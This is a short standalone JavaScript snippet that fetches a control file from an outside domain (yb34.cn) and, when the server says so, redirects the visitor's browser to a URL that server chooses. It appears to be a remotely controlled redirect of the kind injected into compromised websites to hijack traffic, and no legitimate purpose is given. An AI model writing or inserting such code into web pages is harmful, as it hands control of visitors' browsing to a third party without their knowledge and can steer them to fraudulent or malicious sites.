var xhr = new XMLHttpRequest();
xhr.open("get","https://yb34.cn/control.php");
xhr.send();
xhr.onreadystatechange = function(){
    if(xhr.readyState == 4 && xhr.status == 200){_json = JSON.parse(xhr.responseText);if(_json.status==1){setTimeout(function(){window.location.href=_json.url;},1200);}}
}